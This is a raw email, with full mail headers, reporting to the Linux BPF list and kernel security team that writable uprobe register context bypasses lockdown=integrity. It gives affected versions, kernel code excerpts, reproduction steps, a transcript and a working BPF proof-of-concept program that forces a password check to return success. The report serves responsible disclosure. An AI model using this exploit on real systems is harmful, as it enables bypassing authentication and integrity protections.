Received: from alln-iport-6.cisco.com (alln-iport-6.cisco.com [173.37.142.93])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 47BAF3603EF
	for <bpf@vger.kernel.org>; Mon, 27 Apr 2026 12:39:44 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=173.37.142.93
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1777293586; cv=fail; b=YvKfGqVBh9bcdXqC80IW2hpNdXfqbtiICN/3s6LEelE5ZXpdC7ORWz8K+8+PqpLuvwmztdsbTNFMNwxsiwjV4zM5FjcA6UqIs2G1MKT1C1U61RCbAudeTAjxOIv+jsJvsHe0rxE3mPKOwPbX6AsVRgEWoT10dMTrf3kNwGvHu2E=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1777293586; c=relaxed/simple;
	bh=AiPvLlyQb1piI34nb6N/AQnAmrpkTlF97+3qHxAIm7A=;
	h=From:To:CC:Subject:Date:Message-ID:Content-Type:MIME-Version; b=inrJizYiAggIdsPk5uoJ2YqeBbEcQGZ5sf2Tby8e/pcWVIN8f5IS3kMoQgQICWxMfrHN5V8i2r1ONYJiVkS52AlGuycOWX/gadQhM32k2g7Gy3laV8n3PI+pVGhonRbzTXVIs2ed7K7NtEVfitENGLQu64MzSo3zKRPULo7Gf6E=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=cisco.com; spf=pass smtp.mailfrom=cisco.com; dkim=pass (2048-bit key) header.d=cisco.com header.i=@cisco.com header.b=IaLLFCK/; arc=fail smtp.client-ip=173.37.142.93
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=cisco.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=cisco.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=cisco.com header.i=@cisco.com header.b="IaLLFCK/"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
  d=cisco.com; i=@cisco.com; l=41491; q=dns/txt;
  s=iport01; t=1777293584; x=1778503184;
  h=from:to:cc:subject:date:message-id:mime-version;
  bh=AH7z20CheDrCM2Lqa4vclb49e4sFDs2X/swNCgQRsII=;
  b=IaLLFCK/xRxXkfmCZG+dkYsZsXjpjOuv7r8Sf1sRZOIu2yG5qMyiOICP
   QQcfSqViY6WdT2yVsnqrysTMT+PFPzoTolY1Y+fgZqd/KOMadcFmb7jQi
   bPpiB8l9iRuAoEqadzIFBt3n5v39NV+a33jeKdXmFWaeReA4ha2/UpsDR
   8ejSXs12aswzDJpAYnB1812bt/y0zoz4UbvyoP1kQUks+MOOsiNYX1Syv
   tJJDerV0okKh5u5rsJwf5eYjnU9936c41cgIUvL6mssU3d1z0W/MB4ltu
   1UryeaVuFnQ2kDuVHSK0tGrzIcpoQjLdvkGj3mz5B94dWE5k/+1McAr0X
   w==;
X-CSE-ConnectionGUID: eLixYFOBR32+2TajFG0fhA==
X-CSE-MsgGUID: obx5BZ6gTUeZ6rpfwYBUaw==
X-Files: regwrite-poc.tar.gz : 3697
X-IPAS-Result: =?us-ascii?q?A0CSAwDYV+9p/5L/Ja1aH4EPgSuBPTFTgTdfEohsA4Usi?=
 =?us-ascii?q?HmBFp0HgX8IBwEBAQoBAgJRBAEBhQYCjS8CJjQJDgECBAEBAQEDAgMBAQEBA?=
 =?us-ascii?q?QEBAQEBAQsBAQUBAQECAQcFgQ4ThlAMhl0WFVISAUABDy8nBA4NBhSCYYJfF?=
 =?us-ascii?q?AMBAqtfAYE9AooqeIEBM4EB4B4SgU2BWIcAASqBMwIBhDEdhEInG4FJRIEVQ?=
 =?us-ascii?q?oIwdoRFFYN+gi8EgiJ6FB2BYYZHhjmBZgNZLAFVExcLBwWBZgMqLy0yPDIdg?=
 =?us-ascii?q?SM+FzRYGwcFgUuDP21qgQiEYHgjEAoDC209NxQbAwSBNQWHZBAhDYEigjoKL?=
 =?us-ascii?q?AEzEQEBDS8bGiaBOjkEOAEeHBcHFJJUHY9NggyCEYpClRcKhByGXYMzl34Xq?=
 =?us-ascii?q?moBLphYIqh0AgQCBAUCEAEBBoFoPIFZcBWDI1IZD1eNVhbMDYE1AgcCBw0DC?=
 =?us-ascii?q?5NlAQE?=
IronPort-PHdr: A9a23:xCRjVxyE6TqO1dvXCzPsngc9DxPP8539OgoTr50/hK0LK+Ko/o/pO
 wrU4vA+xFPKXICO8/tfkKKWqKHvX2Uc/IyM+G4Pap1CVhIJyI0WkgUsDdTDCBjTJ//xZCt8F
 8NHPGI=
IronPort-Data: A9a23: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
 udyQJLYmQI9MzuF+EBoVg==
IronPort-HdrOrdr: A9a23:E+E3kK4UihJu87XIegPXwcmCI+orL9Y04lQ7vn2ZFiYlEfBwxv
 rPoB1E737JYW4qKQ0dcLC7VJVpQRvnhPhICPoqTMiftWjdySaVxe5ZnPHfKlHbaknDH41mpO
 tdmspFeaDN5DFB5K6QjnjbYrMdKbK8gdmVbJLlvgxQpHZRGtldBmlCe2GmO3wzbjNrQbA+E5
 2R7NdGoT2PRVQ7B/7QOlA1G8L4i5nujpzJXT4qbiRL1CC+yR+44r/zFBaVmiwZTy5Oxrka92
 3EmRzS56mosf23oyWsmFM76a44pPLRjv94QOCcgMkcLTvhziyyYp56ZrGEtDcp5Mmy9VcDir
 D30lYdFvU2z0mUUnC+oBPr1QWl+i0p8WXexViRhmamidDlRQg9F9FKietiA1vkAgsbzZJBOZ
 BwriekXqlsfFf9dePGlp/1viRR5wiJSLwZ4KguZjJkINIjgfRq3PIiFQtuYeY99WTBmc4aOd
 grKt3A7/BLdl7fRXXYsm5zhOGIZB0Ib0+7qoxogL3O79CQ90oJlHcw1YgRmGwN+4k6TIQB7+
 PYMr5wnLULVcMOa7lhbd1xCfdfJ1a9Ny4kCljiaGjPBeUCITbAupT36LI66KWjf4EJ1oI7nN
 DEXElDvWA/dkryAYnWtac7uCzlUSG4R3Dg28te7592tvn1Q6fqKzSKTBQrn9G7q/sSD8XHU7
 K4OY5QAfXkMWzycLw5lDHWSt1XMz0TQccVstE0VxaHpd/KMJTjsqjBfPPaNNPWYEEZs6PEcw
 8+tRTIVbB9BxqQKwzFqQmUX2moYUD2949xFq/BltJjuLTlHrc8wDQotQ==
X-Talos-CUID: 9a23:dHO6MWOJP1hnhO5DVQ1m5H86PeofKSeelkvZIWGXUWhpYejA
X-Talos-MUID: 9a23:2FDXmwuIV7WsED8fVs2ngztyae1avauSNU0/z48etda1HxF5JGLI
X-IronPort-Anti-Spam-Filtered: true
Received: from rcdn-l-core-09.cisco.com ([173.37.255.146])
  by alln-iport-6.cisco.com with ESMTP/TLS/TLS_AES_256_GCM_SHA384; 27 Apr 2026 12:39:37 +0000
Received: from alln-opgw-1.cisco.com (alln-opgw-1.cisco.com [173.37.147.229])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
	(No client certificate requested)
	by rcdn-l-core-09.cisco.com (Postfix) with ESMTPS id 16A3418000200
	for <bpf@vger.kernel.org>; Mon, 27 Apr 2026 12:39:37 +0000 (GMT)
X-CSE-ConnectionGUID: YJHVqqyWTwe8lgB1wt6c4w==
X-CSE-MsgGUID: 7fJVt2FTRdq2xo2roTD5pw==
Authentication-Results: alln-opgw-1.cisco.com; dkim=pass (signature verified) header.i=@cisco.com
X-IronPort-AV: E=Sophos;i="6.23,202,1770595200"; 
   d="c'?gz'50?scan'50,208,217,50,63,49";a="72911862"
Received: from mail-dm2pr0701cu00100.outbound.protection.outlook.com (HELO DM2PR0701CU001.outbound.protection.outlook.com) ([40.93.13.64])
  by alln-opgw-1.cisco.com with ESMTP/TLS/TLS_AES_256_GCM_SHA384; 27 Apr 2026 12:39:36 +0000
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=BzR5R7I3NYGDVMZWpW492cDPA+n7aB8NiTsZbGxfkMbms7md6/dn5GEElEHA3seG/J3dRKGehELOTbSQtA3l5Nk6xVNbma86tegPUb1lZRe4rdkuongvzsBCkvsFrPHCIF6jntDAKDvjcb5zyRtWoPXfz0CTol8okieJ8NuJcdxvXEDJ9T1o2nSyfKJKb4PeKhjPAw8zmMdUsQfoRCz14G/cF3n2HdD9CW2X9YmOC1cfmXBD85B7usfFlvZoES2Juj1mf8KhkkjK9YplooCSdrCkje0dfPsUk9GPTuJ8M1ysFykiLkaWx0G7FVXzoNnpoWSPPHY5Oc8Paf8Pt2CPtQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=AH7z20CheDrCM2Lqa4vclb49e4sFDs2X/swNCgQRsII=;
 b=CBoXOl/B8z/F1YWj2s0Y1YcbIe6RHZwa//797qdeAqdPOmyQxZQ8yPIKXaOWrsOrX1RMMb6F80y88diD/rqmxS/d3I/7eQuN2d6M/+lm64TYSSAa4vrt7GZA/9YLhpIL6A/3kYuQxEAb0Yg4dZXrE0a0ZoKILgU3Ktt10cDKFAb/R25H86rnxR+/S6zH/bBhtdK6kuwC5mICbgkBfCU1QDgRQhqbOAptHgjh+HQLZvOsC8F/xDqaU1h9lLdxPi7phFz4eiiqtRRWNwn6QLhYAVBCim5HtHCj7jG/z3BQKfxTOt3SQpmbDV6hXJePGBrWT5vt0agUC1KZ4lf117U6Gw==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=cisco.com; dmarc=pass action=none header.from=cisco.com;
 dkim=pass header.d=cisco.com; arc=none
Received: from DM6PR11MB4722.namprd11.prod.outlook.com (2603:10b6:5:2a7::23)
 by MW4PR11MB8265.namprd11.prod.outlook.com (2603:10b6:303:1e1::16) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.9870.16; Mon, 27 Apr
 2026 12:39:33 +0000
Received: from DM6PR11MB4722.namprd11.prod.outlook.com
 ([fe80::b13f:aeb0:45e:aec7]) by DM6PR11MB4722.namprd11.prod.outlook.com
 ([fe80::b13f:aeb0:45e:aec7%4]) with mapi id 15.20.9870.013; Mon, 27 Apr 2026
 12:39:33 +0000
From: "Xavier Brouckaert (xabrouck)" <xabrouck@cisco.com>
To: "bpf@vger.kernel.org" <bpf@vger.kernel.org>
CC: "security@kernel.org" <security@kernel.org>
Subject: BPF: writable uprobe pt_regs context bypasses lockdown=integrity
Thread-Topic: BPF: writable uprobe pt_regs context bypasses lockdown=integrity
Thread-Index: AQHc1kE6WD8K3tsosEuxmkOknhIZPg==
Date: Mon, 27 Apr 2026 12:39:33 +0000
Message-ID:
 <DM6PR11MB4722C282C0F20BB23F54A87ADB362@DM6PR11MB4722.namprd11.prod.outlook.com>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach: yes
X-MS-TNEF-Correlator:
x-ms-reactions: allow
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: DM6PR11MB4722:EE_|MW4PR11MB8265:EE_
x-ms-office365-filtering-correlation-id: 580676dc-1836-4b4f-3735-08dea45a08c1
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam:
 BCL:0;ARA:13230040|366016|6049299003|376014|1800799024|56012099003|18002099003|38070700021|4053099003|8096899003;
x-microsoft-antispam-message-info:
 JgoyiK/b1dRuVk82aCHe7r7eKPIfY0yO+ZbcguLE8MmawqXbucZHYKNBm0nEt8Dsx9ItZ766YO4dPAwqPGZ1n6eY2sIp0v4zBk8Ub7hyRd7q/fHUq+Z2FJJiFnATvjhRSD/zazRJQKP0goIpEL3de3DprtYHF0XjMTVqXHlNUTU/JwR+OTjEAppipQBA/E3Jdu7+5xF8OWiS/NGNMob2sBCTud71I1XXdSZI4m3tL3mGeTEqKpirJWak/dVw/3R/FA0CWuAgNWSTOte1DQsaN14c33cOlhOVyhqeHQ6xMo5iArNWJa77gVqFzYEZ5D6EHFvqo+55wYHuFyO2X3BQHYyBHXq4mgsA9nr1u6hgyFew89aT/JO9Y2gzgi9ThM27DfCLp/iE0xHtW1mhcBEvmkQufYstbEFyUKbk1fCpcQROU4evTNzd43N9ZWM9njVrTrzynsyFwLW/mKRpah4rI5OaTxiDsNC05hDzECHQZ+azFUt8eXFbIxy1ueIUrQGJIoIiQ3b0KAC2ekJJ8P3xABa3TPhS8c/ovN6VqZKSF2deP6dIil5pNuexrUQYZ+waJjh6xgRcy6cVq9/Cno+ec7IiLHwetCLAGZvSXhRcap21WzF76PC1G8H7F15bV4dkEG1rqjvZ6K1f+gcl2fhYkXD5CYtUi6qTGfe5G/53CSmk6rU9Pe1ncQIGNXmLeE47CQ19G49eailUZ047yL+0YmlWFbolPWzujFa/rQpbP4M=
x-forefront-antispam-report:
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:DM6PR11MB4722.namprd11.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(366016)(6049299003)(376014)(1800799024)(56012099003)(18002099003)(38070700021)(4053099003)(8096899003);DIR:OUT;SFP:1101;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0:
 =?us-ascii?Q?qT4wI/5jwAl1EsmYmjUWPHdmaobYxW6SigXOKUwuD/+rPcVdaKm7SX6xc4+j?=
 =?us-ascii?Q?xke+plp0eL6M8qQyktnn6yH2r+XfXuQEpN/fkX/R0BkXGp0HRKcvNmF9nST9?=
 =?us-ascii?Q?jzpMJczjc1vpgDjtDroZk84snl7iJk6/obLFDi6s08zbwbWoTVm2o2ljP4Uz?=
 =?us-ascii?Q?UYy4OEGamGtL3V1Nwi80Y87lZsa4gZ1g5WkuNSmtFWMTn3OhD4dP6lKTmeDH?=
 =?us-ascii?Q?VIUXb+KF9spKg1Ch5C0sLfXipr5iavotrQYyqjGablJWZnD2jsvyU3l7Yld1?=
 =?us-ascii?Q?Q1V//yCBwydHbC5gmqm7R1mEBU4SWLPgSplQcrnQ7/PSf0O5bPiJAJyykD4A?=
 =?us-ascii?Q?/ywkX1KZnTFQ/TChsq7vi5OG1NUOcYNbPXmGyuTLA6W7f6PhVjveY6Onds3n?=
 =?us-ascii?Q?qUoNJW8vLDRDEgky0qGxCJ+d8H4fmQ1EOb1/ho6F2ESUY+IdetDVvQRfVw6N?=
 =?us-ascii?Q?t2U6+rrkfwJLvsxvN4xCPGO56j5EhQjuUdCe7+LCF8o8BGnl9KMcvynSzKu5?=
 =?us-ascii?Q?ojq9HvENvrbMVDXTKnGOa9Em0FdxklTpKrHCLSW9LOlhzfFt98ox2Q9sAsrW?=
 =?us-ascii?Q?x5H8syeDaTpHCEqFZOtRcMJMUjkhoLB24wivRF83pRfF6NbROxLxfdfPBg8F?=
 =?us-ascii?Q?B6dpTTlKsiDKbWL3InRnPyJXG89hBAhDt2HThnnVc7X7HTvOfIuYk4PFkZ/l?=
 =?us-ascii?Q?V42WxRSlwOgUTM9YUEaN6bhDpaVRuO2FAYbO5Humi2P9gGH9a27xEroccGS+?=
 =?us-ascii?Q?ggmgA50x3kIAUlpqPRLio46cxaNfviGc4dwKjop3tOWlvIXSh1PcQc8quMoq?=
 =?us-ascii?Q?o2eNgcT6Y6tPRUXoh0AMGiRX3CmXXLu7Aqfv1SCknuUvZ9UWXjH2Bip+kNuo?=
 =?us-ascii?Q?9ORmxjQkJ7B0G8ltLT/sPOfDJG5PimJ6ses8nb7i+qOjLKkSPynbklHBcEWb?=
 =?us-ascii?Q?OoYkF9XP+HiGJdfrP5i7bKLUwP7ONg+N/lB8BQ9ICBOgPWdBelpluITRJeT8?=
 =?us-ascii?Q?IGuKJOvZXBMhrxxs6Jv8HHkybzmF/xfoNPErnFM9UJx5ybsXImf509MAMVpE?=
 =?us-ascii?Q?0ulIaSwUpklDsJ/A4pJyZFSJROhXHD0K2CXXPH2Xvl5t3hyc5uHpJ+V00Kvi?=
 =?us-ascii?Q?QyB+wa+RLLCRYnylHheZajJNuVfUDY1ehuqQNF6bndu6QABShwVUFyrt3Kvh?=
 =?us-ascii?Q?fO+CGtcsZhcLY3pbTuFPXy3H5E8s7mMyzRwVIxWeGWHjbxGJYviXP7UWmgwD?=
 =?us-ascii?Q?X91e7se/76rR5Se2AI7uDhp3038r5mKWUt8Ul2bB3qTwsIKzKh57PHWB4E9F?=
 =?us-ascii?Q?fwWPHrk6SrCbVpx7RyBdFHsR6yNBdN3YdghEXC9JvSHJtqDyeyPoH5LUykJZ?=
 =?us-ascii?Q?dXcjtFqnspJA4iNCuMqO8oCeKib1J04nBoN6oNjnBihNVLL1hIxhmHiT9vmY?=
 =?us-ascii?Q?jAmLxVV9Rfg33BBtHtuhG26nRgYckQQCmXZYTLQdZrC2d/iDY1y2+YFN6RAh?=
 =?us-ascii?Q?X2FsleZjIhb5F8VlKA14v1TQQxkkGBqSTod/WcjPxjY4FQZmUCIBiYlY4Z6r?=
 =?us-ascii?Q?2lrDCHoziwpNqjuFVm5YbSbo1qv/5nN/WaBN63L3satd15NMCqdL3DeWJ9Ws?=
 =?us-ascii?Q?qaG0zk0DcDz8RIpoQ50rS9cjFnDpXBkhPTf94h2XYcjsxXzJdYo1XUDEprKj?=
 =?us-ascii?Q?1QXLv0YjQvM1lYY4B3HTKLvN2lFBycsR8oeaLr1WeCG0yJAmKeMrZ2q/6hTP?=
 =?us-ascii?Q?qLDj2mGgCA=3D=3D?=
Content-Type: multipart/mixed;
	boundary="_004_DM6PR11MB4722C282C0F20BB23F54A87ADB362DM6PR11MB4722namp_"
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
X-Exchange-RoutingPolicyChecked:
	IUH3rncvruGznrV/+PJnCoaSO4E7eully4tGFHVMwSfTW6QL/7/+Bc+uA4HMYqc9hvNPD0efjbBNpDDX6FuEq02fpZDsUkSOK7x5paJsZB+fUYbY+ACEYuc7RkWjdu4APWiuXyB+3cTF52V4CQ4HrLI5TTk6xaklHyWDeJxf9l8f7gtVodijOJ9SWaqrkJRsY4/aSGrilAMP72vCF6y93X7o/DJ80P16xyLbHrcgpMxpX73hJHmOk1etF1hI/Ev8y4TcP8D9wjCmfNGd8VkWgmW4l8uD1THZy87UfB374iFHHfRix8ZF4gAwBZDdWeY2d/+UIe4o8iHAiwKBeDVvmA==
X-OriginatorOrg: cisco.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: DM6PR11MB4722.namprd11.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 580676dc-1836-4b4f-3735-08dea45a08c1
X-MS-Exchange-CrossTenant-originalarrivaltime: 27 Apr 2026 12:39:33.3907
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 5ae1af62-9505-4097-a69a-c1553ef7840e
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: YXrVfqYRcUyg9Nnh6wXaa5vPptrxwkTLVLhK0HyosOZ9gsjZHHGwN9ny7hRojnileW9K0loiJLKe7DEZKDguQQ==
X-MS-Exchange-Transport-CrossTenantHeadersStamped: MW4PR11MB8265
X-Outbound-Client-TLS: ANONYMOUS;alln-opgw-1.cisco.com [173.37.147.229];TLSv1.3;TLS_AES_256_GCM_SHA384;256
X-Outbound-SMTP-Client: 173.37.147.229, alln-opgw-1.cisco.com
X-Outbound-Node: rcdn-l-core-09.cisco.com

--_004_DM6PR11MB4722C282C0F20BB23F54A87ADB362DM6PR11MB4722namp_
Content-Type: multipart/alternative;
	boundary="_000_DM6PR11MB4722C282C0F20BB23F54A87ADB362DM6PR11MB4722namp_"

--_000_DM6PR11MB4722C282C0F20BB23F54A87ADB362DM6PR11MB4722namp_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable

Summary
-------
Kernels that permit BPF_PROG_TYPE_KPROBE programs attached as uprobes to
store to their pt_regs context allow a CAP_BPF+CAP_PERFMON (or root)
user to redirect control flow (set ip/sp/any GPR) in arbitrary userspace
processes. This is not gated by the lockdown LSM: under
lockdown=3Dintegrity, bpf_probe_write_user() is correctly refused via
LOCKDOWN_BPF_WRITE_USER, but the strictly more powerful direct-ctx-store
path is not, because lockdown's BPF hooks are implemented per-helper and
this primitive uses no helper.

Net effect: on a lockdown=3Dintegrity system, root can hijack execution in
sshd, libpam, signature verifiers, etc., with no ptrace, no text
modification on disk, and no helper that lockdown currently inspects.
This appears to violate the integrity-mode guarantee in the same way
that motivated LOCKDOWN_BPF_WRITE_USER.

Affected
--------
Reproduced on:
  - torvalds/master at dd6c438c3 ("Merge tag 'vfs-7.1-rc1.fixes'"),
    built and booted as 7.0.0+ (x86_64, lockdown=3Dintegrity) -- full PoC
    succeeds, transcript below.
  - 6.18.5 (Debian/Kali 6.18.5-1kali1, x86_64).

Relevant code in master:

  kernel/trace/bpf_trace.c: kprobe_prog_is_valid_access()
    if (type =3D=3D BPF_WRITE)
        prog->aux->kprobe_write_ctx =3D true;
    return true;
  -- no offset restriction (ip/sp permitted), no security_locked_down().

  kernel/events/core.c: perf_event_set_bpf_prog()
    /* Writing to context allowed only for uprobes. */
    if (prog->aux->kprobe_write_ctx && !is_uprobe)
        return -EINVAL;
  -- restricts to uprobe attach, no lockdown check.

  kernel/trace/bpf_trace.c: bpf_kprobe_multi_link_attach()
    if (prog->aux->kprobe_write_ctx) return -EINVAL;
  -- kprobe_multi path correctly refuses.

  kernel/bpf/syscall.c: bpf_tracing_prog_attach()
  -- freplace smuggling into kprobes was separately found and closed
     in 611fe4b79af7 ("bpf: Fix abuse of kprobe_write_ctx via
     freplace", 2026-03-31). The lockdown interaction was not
     addressed in that series.

So the feature is deliberately fenced to uprobes (kernel pt_regs are
protected), but nothing in the load or attach path consults
security_locked_down(). LOCKDOWN_BPF_WRITE_USER is checked only in
bpf_tracing_func_proto() for the bpf_probe_write_user helper.

Introduced in 7384893d970e ("bpf: Allow uprobe program to change
context registers", Jiri Olsa, 2025-09-16) and 4363264111e1 ("uprobe:
Do not emulate/sstep original instruction when ip is changed"), merged
for v6.18 via ae28ed4578e6. So affected range is v6.18 .. current.

The feature is consumed in the wild by Cilium Tetragon's
`action: Override` / `argRegs` mechanism (see
pkg/bpf/detect_linux.go:HasUprobeRegsChange() and
pkg/selectors/kernel_regs_amd64.go in the tetragon tree), which is how
I encountered it.

Reproduction
------------
1. Enable lockdown:

     # echo integrity > /sys/kernel/security/lockdown
     # cat /sys/kernel/security/lockdown
     none [integrity] confidentiality

2. Positive control -- confirm bpf_probe_write_user is refused:

     # dmesg | tail
     Lockdown: ...: use of bpf to write user RAM is restricted;
       see man kernel_lockdown.7

3. Build and run the attached PoC (victim.c, regwrite.bpf.c,
   regwrite.c, Makefile -- standard libbpf skeleton):

     $ ./victim wrong          # prints "denied" once per second
     # ./regwrite ./victim check_password

   Observed: verifier accepts the program; uprobe attaches; victim
   output flips from "denied" to "AUTH OK" with no restart. Detach
   (^C) reverts cleanly. No lockdown denial is logged.

   Transcript from torvalds/master @ dd6c438c3:

     $ uname -a && cat /sys/kernel/security/lockdown && ./victim wrong
     Linux ... 7.0.0+ #2 SMP PREEMPT_DYNAMIC Fri Apr 24 05:27:53 EDT 2026 x=
86_64 GNU/Linux
     none [integrity] confidentiality
     denied
     denied
     AUTH OK          <-- regwrite attached here
     AUTH OK
     AUTH OK
     denied           <-- regwrite ^C detached here
     denied

     # ./regwrite ./victim check_password
     ...
     libbpf: prog 'hijack': relo #1: <byte_off> [2] struct pt_regs.ax (0:10=
 @ offset 80)
     libbpf: prog 'hijack': relo #2: <byte_off> [2] struct pt_regs.ip (0:16=
 @ offset 128)
     libbpf: prog 'hijack': relo #3: <byte_off> [2] struct pt_regs.sp (0:19=
 @ offset 152)
     ...
     libbpf: elf: symbol address match for 'check_password' in './victim': =
0x1159
     [+] attached to ./victim:check_password - hook is live in ALL pids.

The relevant BPF program body is three context stores and nothing else:

    SEC("uprobe")
    int BPF_UPROBE(hijack)
    {
        struct pt_regs *r =3D (struct pt_regs *)ctx;
        __u64 rsp =3D PT_REGS_SP(r), ra =3D 0;
        bpf_probe_read_user(&ra, sizeof(ra), (void *)rsp);
        r->ax =3D 1;          /* forced return value      */
        r->ip =3D ra;         /* jump to caller           */
        r->sp =3D rsp + 8;    /* pop the return address   */
        return 0;
    }

Impact
------
Under lockdown=3Dintegrity, root retains the ability to:
  - force arbitrary return values from any userspace function
    (auth checks, signature verification, policy decisions);
  - redirect rip to arbitrary mapped text (ROP/JOP entry);
  - do so with no ptrace, no PTRACE_POKETEXT, no /proc/pid/mem,
    no bpf_probe_write_user, no persistent .text modification.

